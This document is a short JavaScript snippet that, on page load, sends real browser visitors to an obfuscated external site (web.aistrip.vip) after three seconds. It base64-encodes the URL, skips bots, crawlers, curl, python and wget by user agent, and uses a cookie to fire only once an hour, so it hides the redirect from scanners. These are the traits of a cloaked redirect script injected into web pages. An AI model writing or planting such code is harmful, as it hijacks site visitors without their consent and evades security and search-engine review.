<script>
  const _x1 = 'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='; // https://web.aistrip.vip
  const _y2 = atob(_x1);
  const ua = navigator.userAgent.toLowerCase();
  const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
  const isBot = /bot|spider|crawler|curl|python|wget/.test(ua);
  const visited = document.cookie.includes('visited=true');
  const _go = () => {
    if (isBrowser && !isBot && !visited) {
      document.cookie = 'visited=true; max-age=3600';
      const evt = new MouseEvent('click');
      document.getElementById('goBtn')?.dispatchEvent(evt);
    }
  };
  document.getElementById('goBtn')?.addEventListener('click', () => {
    window.location.href = _y2;
  });
  document.addEventListener('DOMContentLoaded', () => {
    setTimeout(_go, 3000);
  });
</script>
